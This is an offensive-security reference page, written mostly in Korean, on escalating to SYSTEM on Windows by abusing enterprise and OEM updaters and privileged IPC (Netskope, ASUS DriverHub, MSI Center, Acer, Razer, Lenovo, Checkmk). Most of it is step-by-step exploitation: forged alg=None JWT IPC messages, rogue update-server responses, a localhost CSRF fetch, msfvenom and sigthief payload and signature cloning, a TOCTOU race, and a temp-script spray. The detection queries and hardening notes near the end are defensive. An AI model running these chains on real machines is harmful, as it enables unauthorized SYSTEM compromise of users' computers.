# Enterprise Auto-Updaters 및 Privileged IPC 악용하기 (예: Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

이 페이지는 낮은 마찰의 IPC 표면과 privileged update flow를 노출하는 enterprise endpoint agents 및 updaters에서 발견되는 Windows local privilege escalation 체인을 일반화한 것입니다. 대표적인 예는 Netskope Client for Windows < R129 (CVE-2025-0309)로, low-privileged user가 attacker-controlled server로의 enrollment를 강제한 뒤, SYSTEM service가 설치하는 악성 MSI를 전달할 수 있습니다.

비슷한 제품에 재사용할 수 있는 핵심 아이디어:
- privileged service의 localhost IPC를 악용해 attacker server로의 re-enrollment 또는 reconfiguration을 강제하기.
- vendor의 update endpoints를 구현하고, rogue Trusted Root CA를 전달한 뒤, updater를 악성 “signed” package로 가리키기.
- 약한 signer checks (CN allow-lists), optional digest flags, 느슨한 MSI properties를 회피하기.
- IPC가 “encrypted”라면, registry에 저장된 world-readable machine identifiers에서 key/IV를 derive하기.
- 서비스가 callers를 image path/process name으로 제한하면, allow-listed process에 inject하거나 suspended 상태로 하나를 띄운 뒤 최소한의 thread-context patch로 DLL을 bootstrap하기.

---
## 1) localhost IPC를 통해 attacker server로 enrollment 강제하기

많은 agents는 JSON을 사용해 localhost TCP를 통해 SYSTEM service와 통신하는 user-mode UI process를 함께 제공합니다.

Netskope에서 관찰된 내용:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) backend host(예: AddonUrl)를 제어하는 claims를 가진 JWT enrollment token을 만듭니다. alg=None을 사용하므로 signature가 필요하지 않습니다.
2) provisioning command를 호출하는 IPC message를 JWT와 tenant name과 함께 전송합니다:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) 서비스가 enrollment/config를 위해 rogue server를 hit하기 시작함, 예:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- caller verification이 path/name-based라면, allow-listed vendor binary에서 request를 originate 하세요(see §4).

---
## 2) update channel을 hijack해서 SYSTEM으로 code 실행

client가 your server와 대화하기 시작하면, expected endpoints를 구현하고 attacker MSI로 steering하세요. Typical sequence:

1) /v2/config/org/clientconfig → 매우 짧은 updater interval을 가진 JSON config를 return, 예:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → PEM CA certificate를 반환합니다. 서비스는 이를 Local Machine Trusted Root store에 설치합니다.
3) /v2/checkupdate → 악성 MSI와 가짜 version을 가리키는 metadata를 제공합니다.

현장에서 흔히 보이는 common checks 우회:
- Signer CN allow-list: 서비스가 Subject CN이 “netSkope Inc” 또는 “Netskope, Inc.”와 같은지만 확인할 수 있습니다. 당신의 rogue CA는 그 CN을 가진 leaf를 발급하고 MSI에 sign할 수 있습니다.
- CERT_DIGEST property: CERT_DIGEST라는 benign MSI property를 포함하세요. install 시 enforcement는 없습니다.
- Optional digest enforcement: config flag(예: check_msi_digest=false)가 추가 cryptographic validation을 비활성화합니다.

결과: SYSTEM 서비스가 다음에서 당신의 MSI를 설치합니다
C:\ProgramData\Netskope\stAgent\data\*.msi
임의의 코드를 NT AUTHORITY\SYSTEM으로 실행합니다.

Patch-bypass 교훈: vendor가 update source를 cryptographically authenticating하는 대신, “trusted” domains의 작은 allow-list만 적용한다면, 여전히 트래픽을 조종할 수 있게 해주는 vendor-owned redirector나 reverse proxy를 찾아보세요. Netskope의 경우, 공개된 후속 연구에서 R129 시절 allow-list가 `rproxy.goskope.com`을 통해 여전히 악용될 수 있었고, 이 도메인은 attacker-controlled Azure App Service content를 proxy했습니다. hostname allow-list는 trust boundary가 아니라 속도 저하 장치로 취급하세요.

---
## 3) 암호화된 IPC requests 위조하기 (존재하는 경우)

R127부터 Netskope는 IPC JSON을 encryptData field로 감싸고, 겉보기에는 Base64처럼 보이게 했습니다. reversing 결과, AES를 사용하며 key/IV는 어떤 사용자라도 읽을 수 있는 registry values에서 파생되었습니다:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

attackers는 암호화를 재현하고 표준 사용자 권한으로 유효한 encrypted commands를 보낼 수 있습니다. 일반 팁: agent가 갑자기 IPC를 “encrypt”한다면, 재료가 되는 device IDs, product GUIDs, install IDs가 HKLM 아래에 있는지 찾아보세요.

---
## 4) IPC caller allow-lists 우회하기 (path/name checks)

일부 서비스는 TCP connection의 PID를 확인하고, Program Files 아래에 있는 allow-listed vendor binaries(예: stagentui.exe, bwansvc.exe, epdlp.exe)의 image path/name과 비교해 peer를 인증하려고 합니다.

실용적인 두 가지 우회:
- allow-listed process(예: nsdiag.exe)에 DLL injection을 하고 그 안에서 IPC를 proxy합니다.
- CreateRemoteThread 없이 suspended 상태의 allow-listed binary를 spawn하고 proxy DLL을 bootstrap하여 driver-enforced tamper rules를 만족합니다(§5 참조).

---
## 5) Tamper-protection에 친화적인 injection: suspended process + NtContinue patch

제품은 protected processes에 대한 handle에서 위험한 권한을 제거하기 위해 minifilter/OB callbacks driver(예: Stadrv)를 함께 제공하는 경우가 많습니다:
- Process: PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME를 제거
- Thread: THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE로 제한

이 제약을 존중하는 신뢰할 수 있는 user-mode loader:
1) CREATE_SUSPENDED로 vendor binary의 CreateProcess를 수행합니다.
2) 여전히 허용되는 handle을 얻습니다: process에 대해 PROCESS_VM_WRITE | PROCESS_VM_OPERATION, thread에 대해 THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (또는 known RIP에서 code를 patch할 수 있으면 THREAD_RESUME만).
3) ntdll!NtContinue(또는 다른 early, guaranteed-mapped thunk)를 아주 작은 stub으로 덮어쓰고, 그 stub이 당신의 DLL path에 대해 LoadLibraryW를 호출한 뒤 다시 점프하도록 합니다.
4) ResumeThread로 in-process에서 stub이 실행되게 하여 DLL을 로드합니다.

이미 protected된 process에서 PROCESS_CREATE_THREAD나 PROCESS_SUSPEND_RESUME를 사용하지 않았고(직접 생성했으므로), driver의 policy를 만족합니다.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin)은 rogue CA, malicious MSI signing, 그리고 필요한 endpoints인 /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate를 자동화합니다.
- UpSkope는 임의의(선택적으로 AES-encrypted) IPC messages를 조작하고, allow-listed binary에서 시작한 것처럼 보이도록 suspended-process injection을 포함하는 custom IPC client입니다.

## 7) Unknown updater/IPC surfaces에 대한 빠른 triage workflow

새로운 endpoint agent나 motherboard “helper” suite를 마주쳤을 때, 아래의 빠른 workflow만으로도 privesc target으로 유망한지 대체로 판단할 수 있습니다:

1) loopback listeners를 열거하고 vendor processes로 다시 매핑합니다:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) 후보 named pipe를 열거합니다:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) 플러그인 기반 IPC 서버가 사용하는 레지스트리 기반 라우팅 데이터를 수집하세요:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) 먼저 user-mode client에서 endpoint 이름, JSON keys, command IDs를 추출하세요. Packed Electron/.NET frontends는 종종 전체 schema를 leak합니다:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
5) 실제 trust predicate를 찾아라, 결국 프로세스를 실행하는 code path만 보지 말고:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
-Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```
Patterns worth prioritizing:
- `CryptQueryObject`/certificate parsing without `WinVerifyTrust` usually means “certificate exists” was treated as “certificate is trusted”, enabling certificate cloning or other fake-signer tricks.
- Substring/suffix checks over `Origin`, `Referer`, download URLs, process names, or signer CNs are not authentication. `contains(".vendor.com")` is usually exploitable with attacker-controlled lookalike domains.
- If the low-privileged GUI decides “the file is trusted” and the SYSTEM broker merely consumes that result, patching or reimplementing the client-side DLL/JS often bypasses the boundary entirely (Razer-style split validation).
- If the broker copies a payload to `%TEMP%`/`C:\Windows\Temp` and then validates or schedules it from that path, immediately test for TOCTOU replacement windows and for sibling plugin modules that expose alternate `ExecuteTask()` wrappers with weaker checks.

For named-pipe-heavy targets, PipeViewer is a quick way to spot weak DACLs and remotely reachable pipes before you start reversing the protocol in depth.

If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 8) Modular add-in brokers authenticated only by vendor signatures (Lenovo Vantage pattern)

A newer variation worth hunting is the **signed-client RPC broker**: a low-privileged Lenovo-signed desktop process talks to a SYSTEM service, and the service routes JSON commands into a set of XML-described add-ins under `%ProgramData%`. Once code execution is achieved **inside any accepted signed client**, every `runas="system"` contract becomes part of your attack surface.

High-value primitives observed in Lenovo Vantage research:
- **Trusting the caller because it is signed by the vendor**: researchers reached an authenticated context by copying a Lenovo-signed EXE to a writable directory and satisfying a DLL side-load (`profapi.dll`) so arbitrary code ran inside a client the service already trusted.
- **Manifest-driven attack surface discovery**: add-ins are declared under `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; several contracts run as `SYSTEM`, so enumerating those manifests often reveals the real privileged verbs faster than reversing the broker itself.
- **Per-command bugs behind the authenticated channel**: once inside the trusted client, public research found path-traversal + race conditions in update/install verbs, raw-SQL abuse in privileged settings databases, and substring-based registry path checks that enabled writes outside the intended hive.

Useful recon on a target:
```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
-Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```
Practical takeaway: helper suite가 먼저 **caller process**를 인증한 뒤에만 수십 개의 plugin/add-in command로 분기하는 broker를 노출한다면, front-door trust check를 우회했다고 해서 거기서 멈추지 마라. manifest/contract table을 덤프하고 각 high-privilege verb를 독립적으로 fuzz하라; authenticated channel에는 보통 여러 second-stage bug가 숨어 있다.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub는 127.0.0.1:53000에서 user-mode HTTP service (ADU.exe)를 제공하며, https://driverhub.asus.com에서 오는 browser call을 기대한다. origin filter는 단순히 Origin header와 `/asus/v1.0/*`가 노출하는 download URL에 대해 `string_contains(".asus.com")`를 수행한다. 따라서 `https://driverhub.asus.com.attacker.tld` 같은 attacker-controlled host도 검사를 통과하고 JavaScript에서 state-changing request를 보낼 수 있다. 추가 bypass pattern은 [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md)를 참고하라.

Practical flow:
1) `.asus.com`을 포함하는 domain을 등록하고 그곳에 malicious webpage를 호스팅한다.
2) `fetch` 또는 XHR을 사용해 `http://127.0.0.1:53000`의 privileged endpoint (예: `Reboot`, `UpdateApp`)를 호출한다.
3) handler가 기대하는 JSON body를 전송한다 – packed frontend JS가 아래 schema를 보여준다.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
아래에 표시된 PowerShell CLI도 Origin 헤더가 신뢰된 값으로 스푸핑되면 성공합니다:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
일반적으로 기억할 점: “helper” suite를 역분석할 때 localhost TCP나 named pipe에서 멈추지 마라. `Elevator`, `Launcher`, `Updater`, `Utility` 같은 이름의 COM class를 확인한 다음, 권한이 높은 서비스가 실제로 대상 binary 자체를 검증하는지, 아니면 patch 가능한 user-mode client DLL이 계산한 결과를 그냥 신뢰하는지 검증하라. 이 패턴은 Razer에만 국한되지 않는다: 높은 권한의 broker가 낮은 권한 측에서 나온 allow/deny decision을 소비하는 split design은 모두 privesc surface 후보다.


---
## Predictable temp script execution during MSI repair (Checkmk Agent / CVE-2024-0670)

일부 Windows agent는 여전히 권한이 필요한 동작을 `C:\Windows\Temp`에 임시 `.cmd`를 쓰고 `SYSTEM`으로 실행하는 방식으로 구현한다. 파일명이 predictable하고 서비스가 기존 파일을 안전하게 재생성하지 않으면, 낮은 권한 사용자가 미래의 temp file을 미리 **read-only**로 만들어 두고 권한이 높은 프로세스가 자기 스크립트 대신 공격자가 제어한 내용을 실행하게 만들 수 있다.

취약한 Checkmk Agent build에서 관찰된 내용:
- temp pattern: `cmk_all_<PID>_1.cmd`
- affected branches: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: 캐시된 agent package의 MSI **repair**

실전 workflow:
1. 현재 process ID 또는 실행 중인 agent PID로부터 현실적인 PID 범위를 추정한다.
2. 짧은 **ASCII** `.cmd` payload를 작성한다 (`Set-Content -Encoding Ascii` 또는 `cmd.exe` redirection; batch file에는 UTF-16 PowerShell output을 피한다).
3. `C:\Windows\Temp\cmk_all_<PID>_1.cmd`를 후보 범위 전체에 뿌리고 각 파일을 read-only로 표시한다.
4. 캐시된 MSI의 repair를 트리거하여 권한이 높은 서비스가 temp script를 재생성하려 시도한 뒤 실행하게 만든다.
```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```
취약한 제품이 Windows Installer로 설치된 경우, 복구를 트리거하기 전에 `C:\Windows\Installer` 아래의 무작위처럼 보이는 캐시된 MSI를 해당 제품 이름으로 다시 매핑하세요:
```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
ForEach-Object {
$p = Get-ItemProperty $_.PSPath
[PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
} | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```
Operational notes:
- `qwinsta`는 `msiexec /fa`가 non-interactive WinRM shell에서 실패할 때 유용하며, 기존 desktop/disconnected session이 repair를 올바르게 트리거할 수 있는지 이해하는 데 도움이 됩니다.
- 이 패턴은 다른 endpoint agents와 updaters에도 일반화됩니다. 이들은 **world-writable location에 temp scripts를 stage한 뒤 나중에 SYSTEM으로 실행**합니다. 예측 가능한 이름, exclusive create semantics의 부재, 그리고 demand에 의해 트리거될 수 있는 repair/update flows를 테스트하세요.

---
## Weak updater validation을 통한 Remote supply-chain hijack (WinGUp / Notepad++)

2025년 6월부터 2025년 12월 사이, Notepad++ update flow 뒤의 hosting infrastructure를 compromise한 attackers는 선택한 victims에게만 malicious manifests를 선택적으로 제공했습니다. 오래된 WinGUp 기반 updaters는 update authenticity를 완전히 verify하지 않았기 때문에, hostile XML response가 clients를 attacker-controlled URLs로 redirect할 수 있었습니다. client가 신뢰된 certificate chain과 downloaded installer의 valid PE signature를 모두 강제하지 않은 HTTPS content를 accepted 했기 때문에, victims는 trojanized NSIS `update.exe`를 fetch하고 execute했습니다.

Operational flow (local exploit required 없음):
1. **Infrastructure interception**: CDN/hosting을 compromise하고 update checks에 attacker metadata로 응답하여 malicious download URL을 가리키게 합니다.
2. **Trojanized NSIS**: installer는 payload를 fetch/execute하고 두 개의 execution chain을 악용합니다:
- **Bring-your-own signed binary + sideload**: signed Bitdefender `BluetoothService.exe`를 bundle하고 그 search path에 malicious `log.dll`을 drop합니다. signed binary가 실행되면 Windows가 `log.dll`을 sideload하고, 이것이 Chrysalis backdoor를 decrypt한 뒤 reflectively load합니다 (static detection을 어렵게 하기 위해 Warbird-protected + API hashing 사용).
- **Scripted shellcode injection**: NSIS가 compiled Lua script를 실행하여 Win32 APIs(예: `EnumWindowStationsW`)를 사용해 shellcode를 inject하고 Cobalt Strike Beacon을 stage합니다.

모든 auto-updater에 대한 hardening/detection takeaways:
- downloaded installer의 **certificate + signature verification**을 강제하세요(벤더 signer pinning, mismatched CN/chain reject) 그리고 update manifest 자체도 sign하세요(예: XMLDSig). validated되지 않은 manifest-controlled redirects는 차단하세요.
- **BYO signed binary sideloading**을 post-download detection pivot으로 취급하세요: signed vendor EXE가 canonical install path 외부의 DLL 이름을 load할 때(예: Bitdefender가 Temp/Downloads에서 `log.dll`을 loading)와 updater가 non-vendor signatures로 temp에서 installer를 drop/execute할 때 alert 하세요.
- 이 chain에서 관찰된 **malware-specific artifacts**를 모니터링하세요(일반적인 pivots로 유용): mutex `Global\Jdhfv_1.0.1`, `%TEMP%`에 대한 비정상적인 `gup.exe` writes, 그리고 Lua-driven shellcode injection stages.
- Notepad++는 v8.8.9 이후 WinGUp을 강화했습니다: 반환되는 XML이 이제 signed(XMLDSig)되며, 최신 builds는 transport만 신뢰하는 대신 downloaded installer에 대해 certificate + signature verification을 강제합니다.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> launching a non-Notepad++ installer</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

이 패턴은 unsigned manifests를 허용하거나 installer signers를 pin하지 못하는 모든 updater에 일반화된다. 즉, network hijack + malicious installer + BYO-signed sideloading으로 “trusted” updates라는 명목 아래 remote code execution이 가능해진다.

---
## References
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [0xdf – HTB: NanoCorp](https://0xdf.gitlab.io/2026/06/20/htb-nanocorp.html)
- [SEC Consult – Local Privilege Escalation via writable files in Checkmk Agent](https://sec-consult.com/vulnerability-lab/advisory/local-privilege-escalation-via-writable-files-in-checkmk-agent/)
- [Checkmk Werk #16361 – Privilege escalation in Windows agent](https://checkmk.com/werk/16361)
- [RunasCs](https://github.com/antonioCoco/RunasCs)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [CyberArk PipeViewer](https://github.com/cyberark/PipeViewer)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)
- [AmberWolf – Bypassing the fix for CVE-2025-0309 in Netskope Client for Windows](https://blog.amberwolf.com/blog/2026/march/patch-bypass---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Atredis – Uncovering Privilege Escalation Bugs in Lenovo Vantage](https://www.atredis.com/blog/2025/7/7/uncovering-privilege-escalation-bugs-in-lenovo-vantage)

{{#include ../../banners/hacktricks-training.md}}
